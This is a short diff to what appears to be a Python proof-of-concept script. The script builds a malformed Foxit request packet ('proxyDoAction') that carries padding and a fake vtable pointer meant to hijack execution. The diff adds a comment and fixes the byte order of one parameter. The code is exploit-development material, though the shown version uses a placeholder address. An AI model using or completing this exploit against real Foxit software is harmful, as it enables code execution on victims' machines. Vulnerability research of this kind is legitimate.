@@ -36,7 +36,9 @@ def gen_packet():
     opcode  = "\x41" * 0x34
 
     # use this if you wanna write an exploit to pwn var_28 and redirect execution
+    # this is the fake vtable
     opcode += struct.pack("I", 0xcafebabe-0x8)
+
     method = "proxyDoAction"
     raw_packet = "foxb"                              # foxit begin header
     raw_packet += "requ"                             # request header
@@ -45,7 +47,7 @@ def gen_packet():
     raw_packet += method                             # method
     raw_packet += struct.pack("<I", 0x3)             # param count
     raw_packet += struct.pack("<I", 0x0)             # empty param
-    raw_packet += struct.pack(">I", 0x0)             # empty param
+    raw_packet += struct.pack("<I", 0x0)             # empty param
     raw_packet += struct.pack("<I", len(opcode))     # length of the opcode buffer
     raw_packet += opcode                             # our opcode buffer
     raw_packet += "foxe"                             # foxit end footer
